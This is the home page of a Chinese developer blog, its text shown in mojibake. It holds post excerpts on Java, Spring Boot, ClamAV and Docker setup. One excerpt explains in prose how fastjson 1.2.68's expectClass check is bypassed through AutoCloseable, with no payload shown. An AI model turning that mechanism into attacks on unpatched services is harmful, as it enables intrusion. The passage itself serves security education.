<!doctype html><html lang=zh dir=auto><head><meta name=generator content="Hugo 0.147.9"><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>æ²¡æœ‰ç†æƒ³çš„äººä¸ä¼¤å¿ƒ</title><meta name=description content="Theme PaperMod - https://github.com/adityatelange/hugo-PaperMod"><meta name=author content="dushixiang"><link rel=canonical href=https://www.typesafe.cn/><link crossorigin=anonymous href=/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css integrity="sha256-j+ECM6cGvIfy4Is8+XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as=style><link rel=icon href=https://www.typesafe.cn/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://www.typesafe.cn/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://www.typesafe.cn/favicon-32x32.png><link rel=apple-touch-icon href=https://www.typesafe.cn/apple-touch-icon.png><link rel=mask-icon href=https://www.typesafe.cn/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate type=application/rss+xml href=https://www.typesafe.cn/index.xml><link rel=alternate type=application/json href=https://www.typesafe.cn/index.json><link rel=alternate hreflang=zh href=https://www.typesafe.cn/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://www.typesafe.cn/"><meta property="og:site_name" content="æ²¡æœ‰ç†æƒ³çš„äººä¸ä¼¤å¿ƒ"><meta property="og:title" content="æ²¡æœ‰ç†æƒ³çš„äººä¸ä¼¤å¿ƒ"><meta property="og:description" content="Theme PaperMod - https://github.com/adityatelange/hugo-PaperMod"><meta property="og:locale" content="zh"><meta property="og:type" content="website"><meta property="og:image" content="https://www.typesafe.cn/papermod-cover.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://www.typesafe.cn/papermod-cover.png"><meta name=twitter:title content="æ²¡æœ‰ç†æƒ³çš„äººä¸ä¼¤å¿ƒ"><meta name=twitter:description content="Theme PaperMod - https://github.com/adityatelange/hugo-PaperMod"><script type=application/ld+json>{"@context":"https://schema.org","@type":"Organization","name":"æ²¡æœ‰ç†æƒ³çš„äººä¸ä¼¤å¿ƒ","url":"https://www.typesafe.cn/","description":"Theme PaperMod - https://github.com/adityatelange/hugo-PaperMod","logo":"https://www.typesafe.cn/favicon.ico","sameAs":["https://github.com/dushixiang","index.xml"]}</script></head><body class=list id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://www.typesafe.cn/ accesskey=h title="æ²¡æœ‰ç†æƒ³çš„äººä¸ä¼¤å¿ƒ (Alt + H)">æ²¡æœ‰ç†æƒ³çš„äººä¸ä¼¤å¿ƒ</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://www.typesafe.cn/archives title=æ–‡ç« ><span>æ–‡ç« </span></a></li><li><a href=https://www.typesafe.cn/categories/ title=åˆ†ç±»><span>åˆ†ç±»</span></a></li><li><a href=https://www.typesafe.cn/search/ title=æœç´¢><span>æœç´¢</span></a></li><li><a href=https://www.typesafe.cn/tags/ title=æ ‡ç­¾><span>æ ‡ç­¾</span></a></li></ul></nav></header><main class=main><article class="first-entry home-info"><header class=entry-header><h1>å…³äºä½œè€…</h1></header><div class=entry-content><h2 id=-å…¨å¹²å‹å¼€å‘ç°å½¹-golangreact-é€‰æ‰‹åŠåŠå­ç½‘ç»œå®‰å…¨å†™è¿‡-5-å¹´-java2022å¹´é¢è¯•æ‰¾å·¥ä½œè¢«åº”å±Šç”Ÿç”¨å…«è‚¡æ–‡åŠæ‰“å°±è½¬äº†-golangä¸è¦æ‰¾æˆ‘è®¨è®ºèŒ´é¦™è±†çš„èŒ´æœ‰å‡ ç§å†™æ³•>ğŸ‘‹ å…¨å¹²å‹å¼€å‘ï¼Œç°å½¹ Golangã€React é€‰æ‰‹ï¼ŒåŠåŠå­ç½‘ç»œå®‰å…¨ã€‚å†™è¿‡ 5 å¹´ Javaï¼Œ2022å¹´é¢è¯•æ‰¾å·¥ä½œè¢«åº”å±Šç”Ÿç”¨å…«è‚¡æ–‡åŠæ‰“ï¼Œå°±è½¬äº† Golangï¼Œä¸è¦æ‰¾æˆ‘è®¨è®ºèŒ´é¦™è±†çš„ã€ŒèŒ´ã€æœ‰å‡ ç§å†™æ³•ã€‚</h2><ul><li>ä»¥ä¸‹æ˜¯æˆ‘å¼€æºçš„å‡ ä¸ªé¡¹ç›®ï¼š</li><li><strong><a href=https://github.com/dushixiang/next-terminal>Next Terminal</a></strong> ä¸€ä¸ªç®€æ´ã€å®‰å…¨ã€æ˜“ç”¨çš„è¿ç»´å®¡è®¡ç³»ç»Ÿï¼Œæ”¯æŒå¤šç§è¿œç¨‹è®¿é—®åè®®ï¼ŒåŒ…æ‹¬ RDPã€SSHã€VNCã€Telnetã€HTTP ç­‰ï¼Œé€‚ç”¨äºä¼ä¸šçº§è¿ç»´åœºæ™¯ã€‚</li><li><strong><a href=https://github.com/dushixiang/kafka-map>kafka-map</a></strong> ä¸€ä¸ªç¾è§‚ç®€æ´ä¸”å¼ºå¤§çš„kafka webç®¡ç†å·¥å…·ã€‚</li><li><strong><a href=https://github.com/dushixiang/4dnat>4dnat</a></strong> ä¸€ä¸ªä¸“é—¨ä¸ºç›®çš„åœ°å€è½¬å‘è€ŒæœåŠ¡çš„å·¥å…·ã€‚</li></ul></div><footer class=entry-footer><div class=social-icons><a href=https://github.com/dushixiang target=_blank rel="noopener noreferrer me" title=Github><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg>
</a><a href=index.xml target=_blank rel="noopener noreferrer me" title=RsS><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></div></footer></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>åœ¨ Java é‡Œå¦‚ä½•è®©æ–¹æ³•åªæ‰§è¡Œä¸€æ¬¡ï¼Ÿ</h2></header><div class=entry-content><p>æœ€è¿‘ä¸€å¹´æ—¶é—´ä¸€ç›´åœ¨å†™ Golang ï¼Œä¹Ÿç®—æ˜¯å¯¹ Golang æœ‰äº†åˆæ­¥çš„æŒæ¡ï¼Œå†æ¬¡å†™ Java çš„æ—¶å€™å‘ç°æœ‰ç‚¹ç”Ÿç–äº†ï¼Œå†™ä»£ç çš„æ—¶å€™ä¹Ÿä¸è‡ªè§‰ä»£å…¥äº†å†™ Golang çš„æ€ç»´ã€‚
æ­£å¦‚æˆ‘æƒ³è¦åœ¨ Java é‡Œé¢æƒ³è®©æŸä¸€ä¸ªæ–¹æ³•åªæ‰§è¡Œä¸€æ¬¡çš„æ—¶å€™ï¼Œæˆ‘ç¬¬ä¸€æ—¶é—´æƒ³åˆ°äº† Golang é‡Œé¢çš„ Once åŠŸèƒ½ã€‚
sync.Once æ˜¯ Golang çš„ä¸€ä¸ªå¹¶å‘åŸè¯­ï¼Œå®ƒæä¾›äº†ä¸€ç§å®‰å…¨åœ°åœ¨å¤šä¸ª goroutine ä¸­æ‰§è¡ŒæŸä¸ªå‡½æ•°ï¼ˆæˆ–ä»£ç å—ï¼‰ä¸€æ¬¡çš„æœºåˆ¶ã€‚
sync.Once ç±»å‹æœ‰ä¸€ä¸ª Do æ–¹æ³•ï¼Œè¯¥æ–¹æ³•æ¥æ”¶ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°ï¼Œå¹¶ç¡®ä¿è¿™ä¸ªå‡½æ•°åªä¼šè¢«æ‰§è¡Œä¸€æ¬¡ï¼Œæ— è®ºæœ‰å¤šå°‘ä¸ª goroutine åŒæ—¶è°ƒç”¨å®ƒã€‚å…·ä½“æ¥è¯´ï¼Œç¬¬ä¸€ä¸ªè°ƒç”¨ Do æ–¹æ³•çš„ goroutine ä¼šæ‰§è¡Œè¿™ä¸ªå‡½æ•°ï¼Œè€Œå…¶ä»– goroutine åˆ™ä¼šç­‰å¾…å®ƒå®Œæˆï¼Œç„¶åè¿”å›ç›¸åŒçš„ç»“æœã€‚
sync.Once å¯ä»¥ç”¨äºä¸€äº›éœ€è¦å…¨å±€åˆå§‹åŒ–çš„åœºæ™¯ï¼Œæ¯”å¦‚åˆå§‹åŒ–é…ç½®ä¿¡æ¯ã€æ•°æ®åº“è¿æ¥ç­‰ã€‚ä½¿ç”¨ sync.Once å¯ä»¥ç¡®ä¿è¿™äº›åˆå§‹åŒ–åªä¼šè¢«æ‰§è¡Œä¸€æ¬¡ï¼Œå¹¶ä¸”å¯ä»¥å®‰å…¨åœ°è¢«å¤šä¸ª goroutine å…±äº«ä½¿ç”¨ã€‚
â€“ æ¥è‡ª ChatGPT
å…¶å®å’Œå•ä¾‹æ¨¡å¼å·®ä¸å¤šï¼Œä½†æˆ‘æƒ³è¦çš„æ˜¯è®©æ–¹æ³•åªæ‰§è¡Œä¸€æ¬¡ï¼Œæˆ‘é­”æ”¹äº†ä¸€ä¸‹ï¼Œç›´æ¥ä¸Šä»£ç å§ã€‚
package cn.typesafe.sync; import lombok.SneakyThrows; import java.util.concurrent.Callable; public class Once&lt;T> { private volatile T t = null; @SneakyThrows public T doOnce(Callable&lt;T> action) { if (t == null) { synchronized (this) { if (t == null) { t = action.call(); } } } return t; } } å•å…ƒæµ‹è¯•
...</p></div><footer class=entry-footer><span title='2023-04-02 13:18:00 +0800 +0800'>å››æœˆ 2, 2023</span>&nbsp;Â·&nbsp;1 åˆ†é’Ÿ&nbsp;Â·&nbsp;dushixiang</footer><a class=entry-link aria-label="post link to åœ¨ Java é‡Œå¦‚ä½•è®©æ–¹æ³•åªæ‰§è¡Œä¸€æ¬¡ï¼Ÿ" href=https://www.typesafe.cn/posts/how-does-java-make-methods-execute-only-once/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>SpringBoot 3.0.0å°é²œä¸Javaæ‰“åŒ…åŸç”ŸäºŒè¿›åˆ¶ã€ä¸€ã€‘</h2></header><div class=entry-content><p>2022å¹´11æœˆ24æ—¥ SpringBoot æ­£å¼å‘å¸ƒäº† 3.0 ç‰ˆæœ¬ï¼Œå¸¦æ¥è®¸å¤šæ–°çš„ç‰¹æ€§ï¼Œä½†æˆ‘æœ€å…³å¿ƒçš„è¿˜æ˜¯Javaæ‰“åŒ…æˆåŸç”ŸäºŒè¿›åˆ¶ï¼Œè¿è¡Œæ—¶ä¸å†ä¾èµ–jreç¯å¢ƒï¼Œè¿è¡ŒJavaç¨‹åºå°†å’ŒGoç¨‹åºä¸€æ ·æ–¹ä¾¿ã€‚
å‡çº§è‡³ SpringBoot 3.0.0 è¯´æ˜¯å°é²œï¼Œä½†æ˜¯æˆ‘ä¸æƒ³å†è¯•ç€æ hello world é‚£ç§å•¥éƒ½æ²¡æœ‰çš„ä¸œè¥¿äº†ï¼Œæ‰¾åˆ°æˆ‘ä¹‹å‰å†™çš„ä¸€ä¸ªJavaå¼€æºé¡¹ç›® kafka-map æ‹¿ä»–å¼€åˆ€ã€‚
kafka-map æœ¬èº«æ˜¯åŸºäº SpringBoot 2.4.x å¼€å‘çš„ï¼Œsqlite å­˜å‚¨æ•°æ®ï¼Œä¸”å¾ˆä¹…æ²¡æœ‰å¤§çš„æ›´æ–°äº†ï¼Œæƒ³è¦ç›´æ¥å‡çº§åˆ° SpringBoot 3.0.0 æ˜¯ä¸å¯èƒ½çš„ï¼Œæˆ‘æŒ‰ç…§å®˜æ–¹æ–‡æ¡£ Spring Boot 3.0 è¿ç§»æŒ‡å— é¦–å…ˆå‡çº§åˆ°æœ€æ–°2.7.xç‰ˆæœ¬ï¼Œç„¶åå°±å‘ç° service ä¾èµ–å¾ªç¯äº†ï¼Œè¿™ä¸ªæ—¶å€™æœ‰ä¸¤ç§é€‰æ‹©ï¼Œä¸€æ˜¯åœ¨é…ç½®æ–‡ä»¶ä¸­å…è®¸ä¾èµ–å¾ªç¯ spring.main.allow-circular-references: trueï¼ŒäºŒæ˜¯æ¢³ç†ä¸šåŠ¡é€»è¾‘è§£å†³ä¾èµ–å¾ªç¯çš„é—®é¢˜ã€‚ä½œä¸ºä¸€ä¸ªåˆæ ¼çš„å¼€å‘ï¼Œæˆ‘é€‰æ‹©äº†è§£å†³ä¾èµ–å¾ªç¯çš„é—®é¢˜ï¼Œè¿‡ç¨‹ä¸è¡¨ã€‚
SpringBoot 3.0.0 å‡çº§äº†å¾ˆå¤šç»„ä»¶ï¼Œå…¶ä¸­ Jpa ä¾èµ–çš„ Hibernate å‡çº§åˆ°äº† 6.xï¼Œæˆ‘å¯åŠ¨æ—¶åˆé‡åˆ°äº† sqlite æ–¹è¨€æ’ä»¶ä¸å¯ç”¨çš„é—®é¢˜ï¼Œè¿˜å¥½ Hibernate 6.x å·²ç»æ”¯æŒäº† sqliteæ–¹è¨€ï¼Œåˆ‡æ¢åˆ°å®˜æ–¹æ’ä»¶å°±å¥½äº†ã€‚é…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼š
spring: datasource: url: jdbc:sqlite:data/kafka-map.db driver-class-name: org.sqlite.JDBC jpa: hibernate: ddl-auto: update show-sql: true properties: hibernate: dialect: org.hibernate.community.dialect.SQLiteDialect åŸç”ŸäºŒè¿›åˆ¶æ‰“åŒ… æ‰“åŒ…åŸç”ŸäºŒè¿›åˆ¶è¿˜æ˜¯æœ€æŠ˜è…¾çš„ï¼Œåˆšå¼€å§‹å‚è€ƒGraalVM Native Image Support æŠŠæ‰“åŒ… springboot:build-image å½“æˆäº†æ‰“åŒ…åŸç”ŸäºŒè¿›åˆ¶äº†ï¼Œè€Œä¸”æ‰“åŒ…çš„è¿‡ç¨‹ä¸­è¿˜é‡åˆ°äº† UnsupportedFeatureException: No instances of ch.qos.logback.classic.Logger è¿™ä¸ªé—®é¢˜ï¼Œæ‰¾äº†ä¸€åœˆä¹Ÿæ²¡æ‰¾åˆ°è§£å†³æ–¹æ¡ˆã€‚
...</p></div><footer class=entry-footer><span title='2022-11-26 23:44:00 +0800 +0800'>åä¸€æœˆ 26, 2022</span>&nbsp;Â·&nbsp;1 åˆ†é’Ÿ&nbsp;Â·&nbsp;dushixiang</footer><a class=entry-link aria-label="post link to SpringBoot 3.0.0å°é²œä¸Javaæ‰“åŒ…åŸç”ŸäºŒè¿›åˆ¶ã€ä¸€ã€‘" href=https://www.typesafe.cn/posts/kafka-map-springboot3-graalvm-1/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>Linux æ€æ¯’è½¯ä»¶ ClamAV å®‰è£…</h2></header><div class=entry-content><p>Clam AntiVirusï¼ˆClamAVï¼‰æ˜¯å…è´¹è€Œä¸”å¼€æ”¾æºä»£ç çš„æ€æ¯’è½¯ä»¶ï¼Œè½¯ä»¶ä¸ç—…æ¯’ç çš„æ›´æ–°çš†ç”±ç¤¾ç¾¤å…è´¹å‘å¸ƒã€‚Github åœ°å€ï¼šhttps://github.com/Cisco-Talos/clamav
å®‰è£… ClamAV yum install -y clamav* é…ç½® ClamAV cat > /etc/freshclam.conf &lt;&lt;EOF # æ•°æ®åº“é…ç½®æ–‡ä»¶å¤¹ DatabaseDirectory /var/lib/clamav # æ›´æ–°æ—¥å¿—æ–‡ä»¶å¤¹ UpdateLogFile /var/log/freshclam.log # æ—¥å¿—å¤§å° LogFileMaxSize 2M # æ—¥å¿—è®°å½•æ—¶é—´ LogTime yes # æ‰€å±ç”¨æˆ· DatabaseOwner root # åŒæ­¥ç—…æ¯’åº“çš„åœ°å€ DatabaseMirror database.clamav.net EOF æ›´æ–°ç—…æ¯’åº“ å¤§æ¦‚éœ€è¦å‡ åˆ†é’Ÿæ—¶é—´
freshclam è¿›è¡Œç—…æ¯’æ‰«ææµ‹è¯• clamscan -ri &lt;/path1/to/scan> &lt;/path2/to/scan> å¸¸ç”¨é…ç½®è¯´æ˜
--recursive[=yes/no(*)] -r é€’å½’æŸ¥æ‰¾ --infected -I åªæ‰“å°å—å½±å“çš„æ–‡ä»¶ä¿¡æ¯ --remove[=yes/no(*)] åˆ é™¤å—å½±å“çš„æ–‡ä»¶ã€‚(ä¸å»ºè®®ä½¿ç”¨,æ ¹æ®æ‰«æç»“æœè¿›è¡Œæ‰‹åŠ¨åˆ é™¤,é¿å…è¯¯åˆ ã€‚) é…ç½®é‚®ç®± å¦‚æœä¸éœ€è¦é‚®ä»¶é€šçŸ¥çš„å¯ä»¥å¿½ç•¥æ­¤æ­¥éª¤ã€‚
å®‰è£…é‚®ä»¶æœåŠ¡ yum install -y mailx ä¿®æ”¹é…ç½® ä¿®æ”¹å¤§å†™å­—æ¯ä¸ºä½ çš„é‚®ç®±é…ç½®
cat > /etc/mail.rc &lt;&lt;EOF set from=USERNAME@YOURDOMAIN.COM set smtp=smtps://smtp.exmail.qq.com:465 set smtp-auth=login set smtp-auth-user=USERNAME@YOURDOMAIN.COM set smtp-auth-password=YOURPASSWORD set ssl-verify=ignore set nss-config-dir=/etc/pki/nssdb/ EOF å‘é€é‚®ä»¶è¿›è¡Œæµ‹è¯• echo "Your message" | mail -v -s "Message Subject" email@address å¦‚æœå‡ºç° â€œError in certificate: Peerâ€™s certificate issuer is not recognizedâ€ å±äºæ­£å¸¸ã€‚
...</p></div><footer class=entry-footer><span title='2022-03-07 21:52:00 +0800 +0800'>ä¸‰æœˆ 7, 2022</span>&nbsp;Â·&nbsp;1 åˆ†é’Ÿ&nbsp;Â·&nbsp;dushixiang</footer><a class=entry-link aria-label="post link to Linux æ€æ¯’è½¯ä»¶ ClamAV å®‰è£…" href=https://www.typesafe.cn/posts/clamav-install/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>åœ¨é“¶æ²³éº’éºŸé«˜çº§æœåŠ¡å™¨æ“ä½œç³»ç»ŸV10ä¸Šå®‰è£…docker</h2></header><div class=entry-content><p>é“¶æ²³éº’éºŸé«˜çº§æœåŠ¡å™¨æ“ä½œç³»ç»Ÿ V10 æ˜¯é’ˆå¯¹ä¼ä¸šçº§å…³é”®ä¸šåŠ¡ï¼Œé€‚åº”è™šæ‹ŸåŒ–ã€ äº‘è®¡ç®—ã€å¤§æ•°æ®ã€å·¥ä¸šäº’è”ç½‘æ—¶ä»£å¯¹ä¸»æœºç³»ç»Ÿå¯é æ€§ã€å®‰å…¨æ€§ã€æ€§èƒ½ã€æ‰©å±•æ€§å’Œ å®æ—¶æ€§çš„éœ€æ±‚ï¼Œä¾æ® CMMI 5 çº§æ ‡å‡†ç ”åˆ¶çš„æä¾›å†…ç”Ÿå®‰å…¨ã€äº‘åŸç”Ÿæ”¯æŒã€å›½äº§ å¹³å°æ·±å…¥ä¼˜åŒ–ã€é«˜æ€§èƒ½ã€æ˜“ç®¡ç†çš„æ–°ä¸€ä»£è‡ªä¸»æœåŠ¡å™¨æ“ä½œç³»ç»Ÿï¼›åŒæºæ”¯æŒé£è…¾ã€ é¾™èŠ¯ã€ç”³å¨ã€å…†èŠ¯ã€æµ·å…‰ã€é²²é¹ç­‰è‡ªä¸»å¹³å°ï¼›å¯æ”¯æ’‘æ„å»ºå¤§å‹æ•°æ®ä¸­å¿ƒæœåŠ¡å™¨é«˜ å¯ç”¨é›†ç¾¤ã€è´Ÿè½½å‡è¡¡é›†ç¾¤ã€åˆ†å¸ƒå¼é›†ç¾¤æ–‡ä»¶ç³»ç»Ÿã€è™šæ‹ŸåŒ–åº”ç”¨å’Œå®¹å™¨äº‘å¹³å°ç­‰ï¼Œ å¯éƒ¨ç½²åœ¨ç‰©ç†æœåŠ¡å™¨å’Œè™šæ‹ŸåŒ–ç¯å¢ƒã€ç§æœ‰äº‘ã€å…¬æœ‰äº‘å’Œæ··åˆäº‘ç¯å¢ƒï¼›åº”ç”¨äºæ”¿åºœã€ å›½é˜²ã€é‡‘èã€æ•™è‚²ã€è´¢ç¨ã€å…¬å®‰ã€å®¡è®¡ã€äº¤é€šã€åŒ»ç–—ã€åˆ¶é€ ç­‰é¢†åŸŸã€‚
å…¬å¸æœ‰ä¸ªé¡¹ç›®éœ€è¦å°†ç³»ç»Ÿéƒ¨ç½²åœ¨ kylinosä¸Šï¼Œåˆšå¼€å§‹è¿˜æœ‰ç‚¹å¤´ç–¼ï¼Œå®³æ€•å„ç§ç¨‹åºæ— æ³•å®‰è£…å’Œä½¿ç”¨ï¼Œç­‰å®‰è£…å¥½æœåŠ¡å™¨è¿›è¡Œä½¿ç”¨çš„æ—¶å€™å‘ç°è¿™ä¸å°±æ˜¯åŸºäºcentosçš„å˜›ï¼Œè™½ç„¶åŸºäºå“ªä¸ªç‰ˆæœ¬ä¸çŸ¥é“ï¼Œä½†æ˜¯å¯ä»¥æµ‹è¯•çš„ï¼Œäºæ˜¯æˆ‘ä¸€é¡¿æ“ä½œï¼Œæœ€åå‘ç°å®ƒæ˜¯åŸºäºCentos8çš„ï¼Œç³»ç»Ÿå†…æ ¸ç‰ˆæœ¬æ˜¯ 4.19ï¼Œé—®é¢˜ä¸å¤§ï¼Œæ—¢ç„¶æ˜¯åŸºäºCentos8çš„ï¼Œé‚£Centos8ä¸Šèƒ½è·‘çš„ç¨‹åºï¼Œåœ¨è¿™è‚¯å®šä¹Ÿèƒ½è·‘ï¼Œç„¶åæˆ‘å°±å¼€å§‹äº†æ„‰å¿«ï¼ˆç—›è‹¦ï¼‰çš„å®‰è£…dockerä¹‹æ—…äº†ã€‚
é…ç½®é˜¿é‡Œäº‘Centos8é•œåƒæº ä¹‹æ‰€ä»¥è¦é…ç½® Centos8 çš„é•œåƒæºæ˜¯å› ä¸ºåœ¨å®‰è£…dockerçš„æ—¶å€™éœ€è¦é¢å¤–çš„ä¸€äº›ä¾èµ–ï¼Œè€Œè¿™äº›ä¾èµ–åœ¨éº’éºŸå®˜æ–¹çš„æºé‡Œé¢æ˜¯æ²¡æœ‰çš„ã€‚
curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-8.repo é…ç½®é˜¿é‡Œäº‘ docker é•œåƒæº yum-config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo sed -i 's+download.docker.com+mirrors.aliyun.com/docker-ce+' /etc/yum.repos.d/docker-ce.repo å®šä¹‰ yum å˜é‡&ä¿®æ”¹ repo ä¿®æ”¹ centos å’Œ docker repoæ–‡ä»¶ä¸­çš„ $releasever ä¸º centos_version ï¼ŒåŸå› æ˜¯åœ¨éº’éºŸæœåŠ¡å™¨æ“ä½œç³»ç»ŸV10ä¸­ $releaseverè¢«ä¿®æ”¹ä¸ºäº† 10ï¼Œè€Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ centos 8çš„é•œåƒæºï¼Œå¦‚æœä½ ä¸æ›¿æ¢ï¼ŒåŸºæœ¬ä¸Šä»“åº“çš„æ¯ä¸€ä¸ªåœ°å€éƒ½æ˜¯404ã€‚
echo "8" > /etc/yum/vars/centos_version sed -i 's/$releasever/$centos_version/g' /etc/yum.repos.d/docker-ce.repo sed -i 's/$releasever/$centos_version/g' /etc/yum.repos.d/CentOS-Base.repo å»ºç«‹yumç¼“å­˜ æ²¡å•¥å¯è¯´çš„
yum makecache æŸ¥çœ‹docker-ce ç‰ˆæœ¬ yum list docker-ce --showduplicates | sort -r docker-ce.x86_64 3:20.10.9-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.8-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.7-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.6-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.5-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.4-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.3-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.2-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.1-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.12-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.11-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.10-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.0-3.el8 docker-ce-stable docker-ce.x86_64 3:19.03.15-3.el8 docker-ce-stable docker-ce.x86_64 3:19.03.15-3.el8 @docker-ce-stable docker-ce.x86_64 3:19.03.14-3.el8 docker-ce-stable docker-ce.x86_64 3:19.03.13-3.el8 docker-ce-stable å®‰è£…docker è¿™é‡Œè¦å®‰è£… docker-ce 19.03 ç‰ˆæœ¬ï¼Œå› ä¸ºæˆ‘åœ¨ä½¿ç”¨æœ€æ–°ç‰ˆ 20.10 å¯åŠ¨å®¹å™¨æ—¶å‡ºç°äº†æœªçŸ¥çš„æƒé™é—®é¢˜ï¼Œè€Œéº’éºŸæœåŠ¡å™¨æ“ä½œç³»ç»Ÿèµ„æ–™ç›¸å¯¹è¾ƒå°‘ï¼Œæˆ‘æœªèƒ½æ‰¾åˆ°ç›¸åº”çš„è§£å†³æ–¹æ¡ˆï¼Œåªå¥½é€€è€Œæ±‚å…¶æ¬¡ï¼Œæ¢åˆ°ä¸Šä¸€ä¸ªç¨³å®šç‰ˆæœ¬ã€‚
...</p></div><footer class=entry-footer><span title='2021-12-21 23:39:00 +0800 +0800'>åäºŒæœˆ 21, 2021</span>&nbsp;Â·&nbsp;2 åˆ†é’Ÿ&nbsp;Â·&nbsp;dushixiang</footer><a class=entry-link aria-label="post link to åœ¨é“¶æ²³éº’éºŸé«˜çº§æœåŠ¡å™¨æ“ä½œç³»ç»ŸV10ä¸Šå®‰è£…docker" href=https://www.typesafe.cn/posts/install-docker-on-kylinos/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>Java ååºåˆ—åŒ–æ¼æ´åŸç†ï¼ˆå…­ï¼‰fastjson 1.2.68 ç»•è¿‡åŸç†</h2></header><div class=entry-content><p>å£°æ˜ æœ¬æ–‡ç« ä¸­æ‰€æœ‰å†…å®¹ä»…ä¾›å­¦ä¹ äº¤æµï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡åæœå‡ä¸ä½œè€…æ— å…³ã€‚
Fastjson &lt;= 1.2.68 expectClass ç»•è¿‡åŸç† å½“ fastjson æ›´æ–°åˆ° 1.2.68 ä¹‹åï¼Œå¤§éƒ¨åˆ†å®‰å…¨æ¼æ´éƒ½å·²ç»å°å µä½äº†ï¼Œä½†ä¸æ’é™¤è¿˜æœ‰äººæ‰‹é‡Œæ¡ç€ä¸€äº› 0day æ²¡æœ‰æ”¾å‡ºæ¥ã€‚
fastjson 1.2.68 åœ¨è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™ï¼Œä¼šè¿›å…¥ ObjectDeserializer çš„ deserialze æ–¹æ³•ï¼Œè€Œ å®‰å…¨äººå‘˜å‘ç° å½“ @type ä¸º java.lang.AutoCloseable çš„æ—¶å€™ä¼šæ‰¾åˆ°å®ç°ç±» JavaBeanDeserializer è°ƒç”¨ deserialzeï¼Œè€Œ JavaBeanDeserializer çš„ deserialze æ–¹æ³•è¿˜ä¼šç»§ç»­è§£æå¾—åˆ°ç¬¬äºŒä¸ª @type å¯¹åº”çš„å€¼è¿›è¡Œååºåˆ—åŒ–ï¼Œå¹¶ä¸” expectClass åˆ™ä¸å†æ˜¯ null å€¼ï¼Œè€Œæ˜¯ java.lang.AutoCloseableã€‚
